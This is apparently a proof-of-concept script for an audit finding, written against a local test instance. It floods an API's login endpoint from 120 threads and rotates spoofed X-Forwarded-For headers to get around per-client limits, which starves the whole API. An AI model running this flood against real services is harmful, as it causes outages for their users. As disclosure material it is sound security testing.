"""PoC FIND-2026-002: anonymous login flood starves the whole API (local instance only)."""

import os
import sys
import threading
import time

import httpx

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18703"
assert BASE.startswith("http://127.0.0.1:"), "local instances only"
USER = "user1"  # test account created per README
PASSWORD = os.environ.get("POC_USER_PASSWORD", "Us3r-Correct-Horse-42")  # throwaway test value

victim = httpx.Client(base_url=BASE, timeout=120)
victim.get("/api/v1/auth/csrf")
tok = victim.cookies.get("csrf_token")
hdr = {"Origin": BASE, "X-CSRF-Token": tok, "X-Forwarded-For": "10.99.99.99"}
assert victim.post("/api/v1/auth/login", json={"username": USER, "password": PASSWORD}, headers=hdr).status_code == 200


def me_latency() -> float:
    t = time.perf_counter()
    victim.get("/api/v1/auth/me", headers={"X-Forwarded-For": "10.99.99.99"})
    return (time.perf_counter() - t) * 1000


print("baseline /me ms:", [round(me_latency()) for _ in range(5)])
stop = threading.Event()


def flood(i: int) -> None:
    c = httpx.Client(base_url=BASE, timeout=120)
    c.get("/api/v1/auth/csrf")
    t = c.cookies.get("csrf_token")
    n = 0
    while not stop.is_set():
        n += 1
        c.post(
            "/api/v1/auth/login",
            json={"username": f"nouser{i}x{n % 3}", "password": "wrong-guess-12345"},
            headers={
                "Origin": BASE,
                "X-CSRF-Token": t,
                "X-Forwarded-For": f"10.{i % 250}.{n % 250}.{(i * 7 + n) % 250}",  # one "client" each
            },
        )


threads = [threading.Thread(target=flood, args=(i,), daemon=True) for i in range(120)]
for th in threads:
    th.start()
time.sleep(3)
print("during flood /me ms:", [round(me_latency()) for _ in range(6)])
stop.set()
for th in threads:
    th.join()
time.sleep(1)
print("after flood /me ms:", [round(me_latency()) for _ in range(3)])
